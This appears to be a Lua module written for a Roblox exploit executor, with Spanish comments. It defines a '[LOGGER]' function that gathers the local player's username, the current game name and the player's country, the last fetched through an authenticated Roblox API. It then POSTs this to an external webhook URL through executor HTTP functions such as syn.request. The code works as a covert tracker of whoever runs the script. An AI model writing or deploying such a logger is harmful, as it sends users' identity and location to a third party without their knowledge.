local function web(webhookURL)
    return function()
        -- Clonar los servicios necesarios
        getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
        getrenv().HttpService = cloneref(game:GetService("HttpService"))
        getrenv().Players = cloneref(game:GetService("Players"))
        
        local HttpService = game:GetService("HttpService")
        local playerName = game.Players.LocalPlayer.Name
        local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        
        -- Obtener el país del jugador utilizando la API de Roblox
        local countryInfo = HttpService:JSONDecode(HttpRbxApiService:GetAsyncFullUrl("https://users.roblox.com/v1/users/authenticated/country-code"))
        local country = countryInfo.countryCode or "Unknown"  -- Si no se puede obtener el país, se establece como "Desconocido"
        
        local message = "[LOGGER] " .. playerName .. " from " .. country .. " in " .. gameName .. "."
        local requestBody = { content = message }
        local headers = { ["Content-Type"] = "application/json" }

        local request = http_request or request or syn.request or http.request
        if request then
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = headers,
                Body = HttpService:JSONEncode(requestBody)
            })
        else
            warn("HTTP request function not available.")
        end
    end
end

return web
